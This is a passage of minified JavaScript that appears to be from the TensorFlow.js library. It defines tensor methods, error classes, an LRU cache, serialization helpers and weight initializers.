        return this.throwIfDisposed(),
        Ge(this)
    }
    ,
    O().prototype.acos = function() {
        return this.throwIfDisposed(),
        bC(this)
    }
    ,
    O().prototype.acosh = function() {
        return this.throwIfDisposed(),
        yC(this)
    }
    ,
    O().prototype.add = function(n) {
        return this.throwIfDisposed(),
        Q(this, n)
    }
    ,
    O().prototype.all = function(n, t) {
        return this.throwIfDisposed(),
        Gm(this, n, t)
    }
    ,
    O().prototype.any = function(n, t) {
        return this.throwIfDisposed(),
        ld(this, n, t)
    }
    ,
    O().prototype.argMax = function(n) {
        return this.throwIfDisposed(),
        vi(this, n)
    }
    ,
    O().prototype.argMin = function(n) {
        return this.throwIfDisposed(),
        SC(this, n)
    }
    ,
    O().prototype.asScalar = function() {
        return this.throwIfDisposed(),
        v(1 === this.size, (()=>"The array must have only 1 element.")),
        W(this, [])
    }
    ,
    O().prototype.asType = function(n) {
        return this.throwIfDisposed(),
        st(this, n)
    }
    ,
    O().prototype.as1D = function() {
        return this.throwIfDisposed(),
        W(this, [this.size])
    }
    ,
    O().prototype.as2D = function(n, t) {
        return this.throwIfDisposed(),
        W(this, [n, t])
    }
    ,
    O().prototype.as3D = function(n, t, e) {
        return this.throwIfDisposed(),
        W(this, [n, t, e])
    }
    ,
    O().prototype.as4D = function(n, t, e, s) {
        return this.throwIfDisposed(),
        W(this, [n, t, e, s])
    }
    ,
    O().prototype.as5D = function(n, t, e, s, o) {
        return this.throwIfDisposed(),
        W(this, [n, t, e, s, o])
    }
    ,
    O().prototype.asin = function() {
        return this.throwIfDisposed(),
        TC(this)
    }
    ,
    O().prototype.asinh = function() {
        return this.throwIfDisposed(),
        RC(this)
    }
    ,
    O().prototype.atan = function() {
        return this.throwIfDisposed(),
        GC(this)
    }
    ,
    O().prototype.atan2 = function(n) {
        return this.throwIfDisposed(),
        EC(this, n)
    }
    ,
    O().prototype.atanh = function() {
        return this.throwIfDisposed(),
        WC(this)
    }
    ,
    O().prototype.avgPool = function(n, t, e, s) {
        return this.throwIfDisposed(),
        hd(this, n, t, e, s)
    }
    ,
    O().prototype.batchToSpaceND = function(n, t) {
        return this.throwIfDisposed(),
        fd(this, n, t)
    }
    ,
    O().prototype.batchNorm = function(n, t, e, s, o) {
        return this.throwIfDisposed(),
        Rc(this, n, t, e, s, o)
    }
    ,
    O().prototype.broadcastTo = function(n) {
        return this.throwIfDisposed(),
        Ni(this, n)
    }
    ,
    O().prototype.cast = function(n) {
        return this.throwIfDisposed(),
        st(this, n)
    }
    ,
    O().prototype.ceil = function() {
        return this.throwIfDisposed(),
        a2(this)
    }
    ,
    O().prototype.clipByValue = function(n, t) {
        return this.throwIfDisposed(),
        nn(this, n, t)
    }
    ,
    O().prototype.concat = function(n, t) {
        return this.throwIfDisposed(),
        n instanceof ae && (n = [n]),
        Xe([this, ...n], t)
    }
    ,
    O().prototype.conv1d = function(n, t, e, s, o, r) {
        return this.throwIfDisposed(),
        Lm(this, n, t, e, s, o, r)
    }
    ,
    O().prototype.conv2dTranspose = function(n, t, e, s, o) {
        return this.throwIfDisposed(),
        Em(this, n, t, e, s, o)
    }
    ,
    O().prototype.conv2d = function(n, t, e, s, o, r) {
        return this.throwIfDisposed(),
        so(this, n, t, e, s, o, r)
    }
    ,
    O().prototype.cos = function() {
        return this.throwIfDisposed(),
        gd(this)
    }
    ,
    O().prototype.cosh = function() {
        return this.throwIfDisposed(),
        Wm(this)
    }
    ,
    O().prototype.cumprod = function(n, t, e) {
        return this.throwIfDisposed(),
        bd(this, n, t, e)
    }
    ,
    O().prototype.cumsum = function(n, t, e) {
        return this.throwIfDisposed(),
        Mm(this, n, t, e)
    }
    ,
    O().prototype.depthToSpace = function(n, t) {
        return this.throwIfDisposed(),
        E2(this, n, t)
    }
    ,
    O().prototype.depthwiseConv2d = function(n, t, e, s, o, r) {
        return this.throwIfDisposed(),
        xd(this, n, t, e, s, o, r)
    }
    ,
    O().prototype.dilation2d = function(n, t, e, s, o) {
        return this.throwIfDisposed(),
        M2(this, n, t, e, s, o)
    }
    ,
    O().prototype.divNoNan = function(n) {
        return this.throwIfDisposed(),
        A2(this, n)
    }
    ,
    O().prototype.div = function(n) {
        return this.throwIfDisposed(),
        dt(this, n)
    }
    ,
    O().prototype.dot = function(n) {
        return this.throwIfDisposed(),
        O2(this, n)
    }
    ,
    O().prototype.elu = function() {
        return this.throwIfDisposed(),
        Gc(this)
    }
    ,
    O().prototype.equal = function(n) {
        return this.throwIfDisposed(),
        Xn(this, n)
    }
    ,
    O().prototype.erf = function() {
        return this.throwIfDisposed(),
        H2(this)
    }
    ,
    O().prototype.euclideanNorm = function(n, t) {
        return this.throwIfDisposed(),
        ev(this, n, t)
    }
    ,
    O().prototype.exp = function() {
        return this.throwIfDisposed(),
        An(this)
    }
    ,
    O().prototype.expandDims = function(n) {
        return this.throwIfDisposed(),
        Ae(this, n)
    }
    ,
    O().prototype.expm1 = function() {
        return this.throwIfDisposed(),
        rv(this)
    }
    ,
    O().prototype.fft = function() {
        return this.throwIfDisposed(),
        eg(this)
    }
    ,
    O().prototype.flatten = function() {
        return this.throwIfDisposed(),
        W(this, [this.size])
    }
    ,
    O().prototype.floor = function() {
        return this.throwIfDisposed(),
        Dc(this)
    }
    ,
    O().prototype.floorDiv = function(n) {
        return this.throwIfDisposed(),
        $m(this, n)
    }
    ,
    O().prototype.gather = function(n, t, e) {
        return this.throwIfDisposed(),
        Id(this, n, t, e)
    }
    ,
    O().prototype.greaterEqual = function(n) {
        return this.throwIfDisposed(),
        oo(this, n)
    }
    ,
    O().prototype.greater = function(n) {
        return this.throwIfDisposed(),
        sn(this, n)
    }
    ,
    O().prototype.ifft = function() {
        return this.throwIfDisposed(),
        Xd(this)
    }
    ,
    O().prototype.irfft = function() {
        return this.throwIfDisposed(),
        US(this)
    }
    ,
    O().prototype.isFinite = function() {
        return this.throwIfDisposed(),
        fv(this)
    }
    ,
    O().prototype.isInf = function() {
        return this.throwIfDisposed(),
        gv(this)
    }
    ,
    O().prototype.isNaN = function() {
        return this.throwIfDisposed(),
        xv(this)
    }
    ,
    O().prototype.leakyRelu = function(n) {
        return this.throwIfDisposed(),
        Cd(this, n)
    }
    ,
    O().prototype.lessEqual = function(n) {
        return this.throwIfDisposed(),
        Qo(this, n)
    }
    ,
    O().prototype.less = function(n) {
        return this.throwIfDisposed(),
        Wc(this, n)
    }
    ,
    O().prototype.localResponseNormalization = function(n, t, e, s) {
        return this.throwIfDisposed(),
        vv(this, n, t, e, s)
    }
    ,
    O().prototype.logSigmoid = function() {
        return this.throwIfDisposed(),
        Gv(this)
    }
    ,
    O().prototype.logSoftmax = function(n) {
        return this.throwIfDisposed(),
        Pm(this, n)
    }
    ,
    O().prototype.logSumExp = function(n, t) {
        return this.throwIfDisposed(),
        Om(this, n, t)
    }
    ,
    O().prototype.log = function() {
        return this.throwIfDisposed(),
        Pn(this)
    }
    ,
    O().prototype.log1p = function() {
        return this.throwIfDisposed(),
        Am(this)
    }
    ,
    O().prototype.logicalAnd = function(n) {
        return this.throwIfDisposed(),
        rs(this, n)
    }
    ,
    O().prototype.logicalNot = function() {
        return this.throwIfDisposed(),
        vd(this)
    }
    ,
    O().prototype.logicalOr = function(n) {
        return this.throwIfDisposed(),
        Km(this, n)
    }
    ,
    O().prototype.logicalXor = function(n) {
        return this.throwIfDisposed(),
        zv(this, n)
    }
    ,
    O().prototype.matMul = function(n, t, e) {
        return this.throwIfDisposed(),
        $t(this, n, t, e)
    }
    ,
    O().prototype.maxPool = function(n, t, e, s) {
        return this.throwIfDisposed(),
        Sd(this, n, t, e, s)
    }
    ,
    O().prototype.max = function(n, t) {
        return this.throwIfDisposed(),
        Tn(this, n, t)
    }
    ,
    O().prototype.maximum = function(n) {
        return this.throwIfDisposed(),
        vs(this, n)
    }
    ,
    O().prototype.mean = function(n, t) {
        return this.throwIfDisposed(),
        ie(this, n, t)
    }
    ,
    O().prototype.min = function(n, t) {
        return this.throwIfDisposed(),
        Lc(this, n, t)
    }
    ,
    O().prototype.minimum = function(n) {
        return this.throwIfDisposed(),
        Gi(this, n)
    }
    ,
    O().prototype.mirrorPad = function(n, t) {
        return this.throwIfDisposed(),
        Hv(this, n, t)
    }
    ,
    O().prototype.mod = function(n) {
        return this.throwIfDisposed(),
        Uv(this, n)
    }
    ,
    O().prototype.mul = function(n) {
        return this.throwIfDisposed(),
        E(this, n)
    }
    ,
    O().prototype.neg = function() {
        return this.throwIfDisposed(),
        ne(this)
    }
    ,
    O().prototype.norm = function(n, t, e) {
        return this.throwIfDisposed(),
        Ec(this, n, t, e)
    }
    ,
    O().prototype.notEqual = function(n) {
        return this.throwIfDisposed(),
        Mc(this, n)
    }
    ,
    O().prototype.oneHot = function(n, t=1, e=0) {
        return this.throwIfDisposed(),
        Zm(this, n, t, e)
    }
    ,
    O().prototype.onesLike = function() {
        return this.throwIfDisposed(),
        fn(this)
    }
    ,
    O().prototype.pad = function(n, t) {
        return this.throwIfDisposed(),
        Td(this, n, t)
    }
    ,
    O().prototype.pool = function(n, t, e, s, o, r) {
        return this.throwIfDisposed(),
        oS(this, n, t, e, s, o, r)
    }
    ,
    O().prototype.pow = function(n) {
        return this.throwIfDisposed(),
        Yo(this, n)
    }
    ,
    O().prototype.prelu = function(n) {
        return this.throwIfDisposed(),
        Rd(this, n)
    }
    ,
    O().prototype.prod = function(n, t) {
        return this.throwIfDisposed(),
        aS(this, n, t)
    }
    ,
    O().prototype.reciprocal = function() {
        return this.throwIfDisposed(),
        RS(this)
    }
    ,
    O().prototype.relu = function() {
        return this.throwIfDisposed(),
        io(this)
    }
    ,
    O().prototype.relu6 = function() {
        return this.throwIfDisposed(),
        _m(this)
    }
    ,
    O().prototype.reshapeAs = function(n) {
        return this.throwIfDisposed(),
        W(this, n.shape)
    }
    ,
    O().prototype.reshape = function(n) {
        return this.throwIfDisposed(),
        W(this, n)
    }
    ,
    O().prototype.resizeBilinear = function(n, t, e) {
        return this.throwIfDisposed(),
        cg(this, n, t, e)
    }
    ,
    O().prototype.resizeNearestNeighbor = function(n, t, e) {
        return this.throwIfDisposed(),
        lg(this, n, t, e)
    }
    ,
    O().prototype.reverse = function(n) {
        return this.throwIfDisposed(),
        ao(this, n)
    }
    ,
    O().prototype.rfft = function() {
        return this.throwIfDisposed(),
        JS(this)
    }
    ,
    O().prototype.round = function() {
        return this.throwIfDisposed(),
        Um(this)
    }
    ,
    O().prototype.rsqrt = function() {
        return this.throwIfDisposed(),
        Ym(this)
    }
    ,
    O().prototype.selu = function() {
        return this.throwIfDisposed(),
        Qm(this)
    }
    ,
    O().prototype.separableConv2d = function(n, t, e, s, o, r) {
        return this.throwIfDisposed(),
        Jm(this, n, t, e, s, o, r)
    }
    ,
    O().prototype.sigmoid = function() {
        return this.throwIfDisposed(),
        _o(this)
    }
    ,
    O().prototype.sign = function() {
        return this.throwIfDisposed(),
        FS(this)
    }
    ,
    O().prototype.sin = function() {
        return this.throwIfDisposed(),
        jm(this)
    }
    ,
    O().prototype.sinh = function() {
        return this.throwIfDisposed(),
        qm(this)
    }
    ,
    O().prototype.slice = function(n, t) {
        return this.throwIfDisposed(),
        Xt(this, n, t)
    }
    ,
    O().prototype.softmax = function(n) {
        return this.throwIfDisposed(),
        zd(this, n)
    }
    ,
    O().prototype.softplus = function() {
        return this.throwIfDisposed(),
        $i(this)
    }
    ,
    O().prototype.spaceToBatchND = function(n, t) {
        return this.throwIfDisposed(),
        Nd(this, n, t)
    }
    ,
    O().prototype.split = function(n, t) {
        return this.throwIfDisposed(),
        on(this, n, t)
    }
    ,
    O().prototype.sqrt = function() {
        return this.throwIfDisposed(),
        Ee(this)
    }
    ,
    O().prototype.square = function() {
        return this.throwIfDisposed(),
        Bt(this)
    }
    ,
    O().prototype.squaredDifference = function(n) {
        return this.throwIfDisposed(),
        qS(this, n)
    }
    ,
    O().prototype.squeeze = function(n) {
        return this.throwIfDisposed(),
        Di(this, n)
    }
    ,
    O().prototype.stack = function(n, t) {
        this.throwIfDisposed();
        const e = n instanceof ae ? [this, n] : [this, ...n];
        return On(e, t)
    }
    ,
    O().prototype.step = function(n) {
        return this.throwIfDisposed(),
        Wi(this, n)
    }
    ,
    O().prototype.stridedSlice = function(n, t, e, s, o, r, i, a) {
        return this.throwIfDisposed(),
        ok(this, n, t, e, s, o, r, i, a)
    }
    ,
    O().prototype.sub = function(n) {
        return this.throwIfDisposed(),
        pt(this, n)
    }
    ,
    O().prototype.sum = function(n, t) {
        return this.throwIfDisposed(),
        ut(this, n, t)
    }
    ,
    O().prototype.tan = function() {
        return this.throwIfDisposed(),
        ik(this)
    }
    ,
    O().prototype.tanh = function() {
        return this.throwIfDisposed(),
        pd(this)
    }
    ,
    O().prototype.tile = function(n) {
        return this.throwIfDisposed(),
        Nn(this, n)
    }
    ,
    O().prototype.toBool = function() {
        return this.throwIfDisposed(),
        st(this, "bool")
    }
    ,
    O().prototype.toFloat = function() {
        return this.throwIfDisposed(),
        st(this, "float32")
    }
    ,
    O().prototype.toInt = function() {
        return this.throwIfDisposed(),
        st(this, "int32")
    }
    ,
    O().prototype.topk = function(n, t) {
        return this.throwIfDisposed(),
        uk(this, n, t)
    }
    ,
    O().prototype.transpose = function(n) {
        return this.throwIfDisposed(),
        kt(this, n)
    }
    ,
    O().prototype.unique = function(n) {
        return this.throwIfDisposed(),
        pk(this, n)
    }
    ,
    O().prototype.unsortedSegmentSum = function(n, t) {
        return this.throwIfDisposed(),
        og(this, n, t)
    }
    ,
    O().prototype.unstack = function(n) {
        return this.throwIfDisposed(),
        lo(this, n)
    }
    ,
    O().prototype.where = function(n, t) {
        return this.throwIfDisposed(),
        Le(n, this, t)
    }
    ,
    O().prototype.zerosLike = function() {
        return this.throwIfDisposed(),
        St(this)
    }
    ;
    class Zn extends Error {
        constructor(t) {
            super(t),
            Object.setPrototypeOf(this, Zn.prototype)
        }
    }
    class gn extends Error {
        constructor(t) {
            super(t),
            Object.setPrototypeOf(this, gn.prototype)
        }
    }
    class $ extends Error {
        constructor(t) {
            super(t),
            Object.setPrototypeOf(this, $.prototype)
        }
    }
    class bt extends Error {
        constructor(t) {
            super(t),
            Object.setPrototypeOf(this, bt.prototype)
        }
    }
    class kh extends Error {
        constructor(t) {
            super(t),
            Object.setPrototypeOf(this, kh.prototype)
        }
    }
    class i0 {
        constructor(t) {
            this.maxEntries = t || 100,
            this.cache = new Map
        }
        get(t) {
            let e;
            return this.cache.has(t) && (e = this.cache.get(t),
            this.cache.delete(t),
            this.cache.set(t, e)),
            e
        }
        put(t, e) {
            if (this.cache.has(t))
                this.cache.delete(t);
            else if (this.cache.size >= this.maxEntries) {
                const s = this.cache.keys().next().value;
                this.cache.delete(s)
            }
            this.cache.set(t, e)
        }
        getMaxEntries() {
            return this.maxEntries
        }
        setMaxEntries(t) {
            if (t < 0)
                throw new Error(`The maxEntries of LRU caches must be at least 0, but got ${t}.`);
            if (this.maxEntries > t)
                for (let e = 0; e < this.maxEntries - t; e++) {
                    const s = this.cache.keys().next().value;
                    this.cache.delete(s)
                }
            this.maxEntries = t
        }
    }
    function ho(n, t) {
        if (Array.isArray(n)) {
            let e = [];
            for (let s = 0; s < t; s++)
                e = e.concat(n);
            return e
        }
        {
            const e = new Array(t);
            return e.fill(n),
            e
        }
    }
    function Bn(n, t) {
        if (!n)
            throw new kh(t)
    }
    function a0(n, t) {
        let e = 0;
        for (const s of n)
            s === t && e++;
        return e
    }
    function Pe(n) {
        return 1 === n.length ? n[0] : n
    }
    function Lt(n) {
        return Array.isArray(n) ? n : [n]
    }
    function ls(n) {
        const e = n.replace(/(.)([A-Z][a-z0-9]+)/g, "$1_$2").replace(/([a-z])([A-Z])/g, "$1_$2").toLowerCase();
        return "_" !== e[0] ? e : "private" + e
    }
    function po(n) {
        return n.length <= 1 || -1 === n.indexOf("_") ? n : n.replace(/[_]+(\w|$)/g, ((t,e)=>e.toUpperCase()))
    }
    let bn = {};
    function Th(n) {
        if (null == n)
            return null;
        const t = {};
        return t.className = n.getClassName(),
        t.config = n.getConfig(),
        t
    }
    function Nh(n) {
        if (null != n && "object" == typeof n)
            if (Array.isArray(n))
                n.forEach((t=>Nh(t)));
            else {
                const t = Object.keys(n);
                for (const e of t) {
                    const s = n[e];
                    null != s && "object" == typeof s && (Array.isArray(s) || "ndarray" !== s.type || "number" != typeof s.value ? Nh(s) : n[e] = s.value)
                }
            }
    }
    function zi(n, t={}, e={}, s="object", o=!1) {
        if ("string" == typeof n) {
            const r = n;
            let i;
            if (r in e)
                i = e[r];
            else if (r in bn)
                i = bn[r];
            else if (i = t[r],
            null == i)
                throw new $(`Unknown ${s}: ${n}. This may be due to one of the following reasons:\n1. The ${s} is defined in Python, in which case it needs to be ported to TensorFlow.js or your JavaScript code.\n2. The custom ${s} is defined in JavaScript, but is not registered properly with tf.serialization.registerClass().`);
            return i
        }
        {
            const r = n;
            if (null == r.className || null == r.config)
                throw new $(`${s}: Improper config format: ${JSON.stringify(r)}.\n'className' and 'config' must set.`);
            const i = r.className;
            let a, c;
            if (i in e ? [a,c] = e[i] : i in bn ? [a,c] = bn.className : i in t && ([a,c] = t[i]),
            null == a)
                throw new $(`Unknown ${s}: ${i}. This may be due to one of the following reasons:\n1. The ${s} is defined in Python, in which case it needs to be ported to TensorFlow.js or your JavaScript code.\n2. The custom ${s} is defined in JavaScript, but is not registered properly with tf.serialization.registerClass().`);
            if (null != c) {
                const l = {};
                for (const p of Object.keys(bn))
                    l[p] = bn[p];
                for (const p of Object.keys(e))
                    l[p] = e[p];
                r.config.customObjects = l;
                const d = Object.assign({}, bn);
                for (const p of Object.keys(e))
                    bn[p] = e[p];
                Nh(r.config);
                const h = c(a, r.config, e, o);
                return bn = Object.assign({}, d),
                h
            }
            {
                const l = Object.assign({}, bn);
                for (const d of Object.keys(e))
                    bn[d] = e[d];
                const u = new a(r.config);
                return bn = Object.assign({}, l),
                u
            }
        }
    }
    function Kc(n, t) {
        return -1 * function zR(n, t) {
            return n < t ? -1 : n > t ? 1 : 0
        }(n, t)
    }
    function Ts(n) {
        if (null == n)
            return n;
        const t = [];
        for (const e of n)
            -1 === t.indexOf(e) && t.push(e);
        return t
    }
    function XR(n) {
        if (null == n)
            throw new $(`Invalid value in obj: ${JSON.stringify(n)}`);
        for (const t in n)
            if (n.hasOwnProperty(t))
                return !1;
        return !0
    }
    function fo(n, t, e) {
        if (null != e && n.indexOf(e) < 0)
            throw new $(`${e} is not a valid ${t}.  Valid values are ${n} or null/undefined.`)
    }
    function Rh(n, t, e=0, s=1 / 0) {
        return Bn(e >= 0),
        Bn(s >= e),
        Array.isArray(n) && n.length >= e && n.length <= s && n.every((o=>typeof o === t))
    }
    function be(n, t) {
        Array.isArray(n) ? (v(n.length > 0, (()=>`${t} is unexpectedly an empty array.`)),
        n.forEach(((e,s)=>be(e, `element ${s + 1} of ${t}`)))) : v(Number.isInteger(n) && n > 0, (()=>`Expected ${t} to be a positive integer, but got ${c0(n)}.`))
    }
    function c0(n) {
        return null === n ? "null" : Array.isArray(n) ? "[" + n.map((t=>c0(t))).join(",") + "]" : "string" == typeof n ? `"${n}"` : `${n}`
    }
    function l0(n) {
        return "relu" === n ? "relu" : "linear" === n ? "linear" : "elu" === n ? "elu" : null
    }
    let PR = 0;
    function u0() {
        return PR++
    }
    const Zc = {};
    function Bc(n="") {
        return n in Zc || (Zc[n] = 0),
        Zc[n] += 1,
        n + Zc[n].toString()
    }
    const OR = ["channelsFirst", "channelsLast"]
      , KR = ["nearest", "bilinear"]
      , ZR = ["valid", "same", "causal"]
      , BR = ["max", "avg"]
      , HR = ["sum", "mul", "concat", "ave"]
      , er = new Map;
    function se(n) {
        fo(OR, "DataFormat", n)
    }
    function rn(n) {
        fo(ZR, "PaddingMode", n)
    }
    function d0(n) {
        fo(BR, "PoolMode", n)
    }
    const Xi = []
      , h0 = "/";
    function mo(n, t) {
        Xi.push(n);
        try {
            const e = t();
            return Xi.pop(),
            e
        } catch (e) {
            throw Xi.pop(),
            e
        }
    }
    function p0(n) {
        if (!m0(n))
            throw new Error("Not a valid tensor name: '" + n + "'");
        return function UR() {
            return 0 === Xi.length ? "" : Xi.join(h0) + h0
        }() + n
    }
    function f0(n) {
        if (!m0(n))
            throw new Error("Not a valid tensor name: '" + n + "'");
        er.has(n) || er.set(n, 0);
        const t = er.get(n);
        if (er.set(n, er.get(n) + 1),
        t > 0) {
            const e = `${n}_${t}`;
            return er.set(e, 1),
            e
        }
        return n
    }
    const YR = new RegExp(/^[A-Za-z0-9][-A-Za-z0-9\._\/]*$/);
    function m0(n) {
        return !!n.match(YR)
    }
    function QR(n) {
        return n === parseInt(n.toString(), 10)
    }
    function Ns(n, t, e) {
        null == t && (t = 0),
        null == e && (e = n.length);
        let s = 1;
        for (let o = t; o < e; ++o)
            s *= n[o];
        return s
    }
    function nr(n) {
        if (0 === n.length)
            return Number.NaN;
        let t = Number.POSITIVE_INFINITY;
        for (let e = 0; e < n.length; e++) {
            const s = n[e];
            s < t && (t = s)
        }
        return t
    }
    function Rs(n) {
        if (0 === n.length)
            return Number.NaN;
        let t = Number.NEGATIVE_INFINITY;
        for (let e = 0; e < n.length; e++) {
            const s = n[e];
            s > t && (t = s)
        }
        return t
    }
    function $n(n, t) {
        if (t < n)
            throw new $(`end (${t}) < begin (${n}) is forbidden.`);
        const e = [];
        for (let s = n; s < t; ++s)
            e.push(s);
        return e
    }
    let $h;
    function le() {
        return null == $h && ($h = ys().epsilon()),
        $h
    }
    function Hn(n, t) {
        return st(n, t)
    }
    function Ai(n, t=-1) {
        const e = n.shape.slice();
        return t < 0 && (t = e.length + t + 1),
        e.splice(t, 0, 1),
        W(n, e)
    }
    function go(n, t, e) {
        return M((()=>{
            switch (n.rank) {
            case 1:
                return Vd(n, t, e);
            case 2:
                return tg(n, [t, 0], [e, n.shape[1]]);
            case 3:
                return Fd(n, [t, 0, 0], [e, n.shape[1], n.shape[2]]);
            case 4:
                return Fc(n, [t, 0, 0, 0], [e, n.shape[1], n.shape[2], n.shape[3]]);
            case 5:
                return Xt(n, [t, 0, 0, 0, 0], [e, n.shape[1], n.shape[2], n.shape[3], n.shape[4]]);
            case 6:
                return Xt(n, [t, 0, 0, 0, 0, 0], [e, n.shape[1], n.shape[2], n.shape[3], n.shape[4], n.shape[5]]);
            default:
                throw new $(`sliceAlongFirstAxis() received an unsupported tensor rank: ${n.rank}`)
            }
        }
        ))
    }
    function Gh(n, t, e) {
        return M((()=>{
            switch (n.rank) {
            case 1:
                return Vd(n, t, e);
            case 2:
                return tg(n, [0, t], [n.shape[0], e]);
            case 3:
                return Fd(n, [0, 0, t], [n.shape[0], n.shape[1], e]);
            case 4:
                return Fc(n, [0, 0, 0, t], [n.shape[0], n.shape[1], n.shape[2], e]);
            default:
                throw new $(`sliceAlongLastAxis() received an unsupported tensor rank: ${n.rank}`)
            }
        }
        ))
    }
    function Hc(n, t, e, s) {
        return M((()=>{
            switch (n.rank) {
            case 1:
                return Vd(n, t, e);
            case 2:
                switch (s) {
                case 1:
                    return go(n, t, e);
                case 2:
                    return Gh(n, t, e);
                default:
                    throw new $(`The axis is not within the rank of the tensor ${s}`)
                }
            case 3:
                switch (s) {
                case 1:
                    return go(n, t, e);
                case 2:
                    return Fd(n, [0, t, 0], [n.shape[0], e, n.shape[2]]);
                case 3:
                    return Gh(n, t, e);
                default:
                    throw new $(`The axis is not within the rank of the tensor ${s}`)
                }
            case 4:
                switch (s) {
                case 1:
                    return go(n, t, e);
                case 2:
                    return Fc(n, [0, t, 0, 0], [n.shape[0], e, n.shape[2], n.shape[3]]);
                case 3:
                    return Fc(n, [0, 0, t, 0], [n.shape[0], n.shape[1], e, n.shape[3]]);
                case 4:
                    return Gh(n, t, e);
                default:
                    throw new $(`The axis is not within the rank of the tensor ${s}`)
                }
            default:
                throw new $(`sliceAlongLastAxis() received an unsupported tensor rank: ${n.rank}`)
            }
        }
        ))
    }
    function Lh(n, t=-1) {
        let e;
        return t < 0 && (e = n[0].rank,
        t = 0 !== e ? e : 0),
        t === n[0].rank && (t = -1),
        Xe(n, t)
    }
    function g0(n, t) {
        switch (n.rank) {
        case 1:
            return u2([n, t]);
        case 2:
            return h2([n, t], 0);
        case 3:
            return f2([n, t], 0);
        case 4:
            return g2([n, t], 0);
        default:
            throw new $(`concatAlongFirstAxis() received an unsupported tensor rank: ${n.rank}`)
        }
    }
    function Eh(n, t) {
        if (Array.isArray(t) || (t = [t]),
        n.rank !== t.length)
            throw new $(`The length of input n (${t.length}) does not match the number of dimensions in input x (${n.rank})`);
        return Nn(n, t)
    }
    function _c(n, t=0, e=1, s, o) {
        return SS(n, t, e, s, o)
    }
    function _n(n, t, e, s) {
        if (n.rank < 2 || t.rank < 2)
            throw new bt(`dot requires both inputs to be rank >= 2 but got x shape = ${n.shape} and y shape = ${t.shape}`);
        if (t.rank >= 3) {
            if (n.shape.slice(-1)[0] !== t.shape.slice(-2)[0])
                throw new bt(`If rank y >= 3, then the second last dim of y must equal the last dim of x but got x shape = ${n.shape} and  y shape = ${t.shape}`)
        }
        if (2 === n.rank && 2 === t.rank)
            return ig({
                a: n,
                b: t,
                transposeA: !1,
                transposeB: !1,
                bias: s ? Dh(n.rank, s, "channelsLast") : null,
                activation: e
            });
        {
            const o = n.shape.slice()
              , r = o.pop();
            n = W(n, [-1, r]);
            const i = t.shape.slice()
              , a = i.pop()
              , c = i.pop()
              , l = [...i, a]
              , u = Array.from({
                length: t.rank
            }, ((f,m)=>0 === m ? t.rank - 2 : m <= t.rank - 2 ? m - 1 : m));
            t = W(kt(t, u), [c, -1]);
            const d = [...o, ...l];
            return W(ig({
                a: n,
                b: t,
                transposeA: !1,
                transposeB: !1,
                bias: s ? Dh(n.rank, s, "channelsLast") : null,
                activation: e
            }), d)
        }
    }
    function b0(n, t, e) {
        return M((()=>(t = Array.isArray(t) ? Ue(t, "int32") : st(t, "int32"),
        Id(n, t, e))))
    }
    function Pi(n) {
        return E(n, n)
    }
    function Dh(n, t, e) {
        const s = t.shape;
        if (1 !== t.rank && t.rank !== n)
            throw new $(`Unexpected bias dimensions: ${t.rank}; expected it to be 1 or ${n}`);
        if (5 === n) {
            if ("channelsFirst" === e)
                return 1 === s.length ? W(t, [1, s[0], 1, 1, 1]) : W(t, [1, s[3], s[0], s[1], s[2]]);
            if ("channelsLast" === e)
                return 1 === s.length ? W(t, [1, 1, 1, 1, s[0]]) : W(t, [1].concat(s))
        } else if (4 === n) {
            if ("channelsFirst" === e)
                return 1 === s.length ? W(t, [1, s[0], 1, 1]) : W(t, [1, s[2], s[0], s[1]]);
            if ("channelsLast" === e)
                return 1 === s.length ? W(t, [1, 1, 1, s[0]]) : W(t, [1].concat(s))
        } else if (3 === n) {
            if ("channelsFirst" === e)
                return 1 === s.length ? W(t, [1, s[0], 1]) : W(t, [1, s[1], s[0]]);
            if ("channelsLast" === e)
                return 1 === s.length ? W(t, [1, 1, s[0]]) : W(t, [1].concat(s))
        } else if (n < 3)
            return t;
        throw new $(`Unsupported input rank by biasAdd: ${t.rank}`)
    }
    function Ln(n, t, e) {
        return M((()=>(null == e && (e = "channelsLast"),
        se(e),
        Q(n, Dh(n.rank, t, e)))))
    }
    function x0(n, t, e, s) {
        return M((()=>Ik(n, t, e, s)))
    }
    function Oi(n, t, e=!1) {
        return e ? n() : t()
    }
    const s$ = ["fanIn", "fanOut", "fanAvg"]
      , o$ = ["normal", "uniform", "truncatedNormal"];
    class xn extends qo {
        fromConfigUsesCustomObjects() {
            return !1
        }
        getConfig() {
            return {}
        }
    }
    class y0 extends xn {
        apply(t, e) {
            return ge(t, e)
        }
    }
    y0.className = "Zeros",
    _(y0);
    class Wh extends xn {
        apply(t, e) {
            return Ss(t, e)
        }
    }
    Wh.className = "Ones",
    _(Wh);
    class I0 extends xn {
        constructor(t) {
            if (super(),
            "object" != typeof t)
                throw new $(`Expected argument of type ConstantConfig but got ${t}`);
            if (void 0 === t.value)
                throw new $(`config must have value set but got ${t}`);
            this.value = t.value
        }
        apply(t, e) {
            return M((()=>E(Gt(this.value), Ss(t, e))))
        }
        getConfig() {
            return {
                value: this.value
            }
        }
    }
    I0.className = "Constant",
    _(I0);
    class w0 extends xn {
        constructor(t) {
            super(),
            this.DEFAULT_MINVAL = -.05,
            this.DEFAULT_MAXVAL = .05,
            this.minval = t.minval || this.DEFAULT_MINVAL,
            this.maxval = t.maxval || this.DEFAULT_MAXVAL,
            this.seed = t.seed
        }
        apply(t, e) {
            return Li(t, this.minval, this.maxval, e, this.seed)
        }
        getConfig() {
            return {
                minval: this.minval,
                maxval: this.maxval,
                seed: this.seed
            }
        }
    }
    w0.className = "RandomUniform",
    _(w0);
    class C0 extends xn {
        constructor(t) {
            super(),
            this.DEFAULT_MEAN = 0,
            this.DEFAULT_STDDEV = .05,
            this.mean = t.mean || this.DEFAULT_MEAN,
            this.stddev = t.stddev || this.DEFAULT_STDDEV,
            this.seed = t.seed
        }
        apply(t, e) {
            if ("float32" !== (e = e || "float32") && "int32" !== e)
                throw new bt(`randomNormal does not support dType ${e}.`);
            return _c(t, this.mean, this.stddev, e, this.seed)
        }
        getConfig() {
            return {
                mean: this.mean,
                stddev: this.stddev,
                seed: this.seed
            }
        }
    }
    C0.className = "RandomNormal",
    _(C0);
    class v0 extends xn {
        constructor(t) {
            super(),
            this.DEFAULT_MEAN = 0,
            this.DEFAULT_STDDEV = .05,
            this.mean = t.mean || this.DEFAULT_MEAN,
            this.stddev = t.stddev || this.DEFAULT_STDDEV,
            this.seed = t.seed
        }
        apply(t, e) {
            if ("float32" !== (e = e || "float32") && "int32" !== e)
                throw new bt(`truncatedNormal does not support dType ${e}.`);
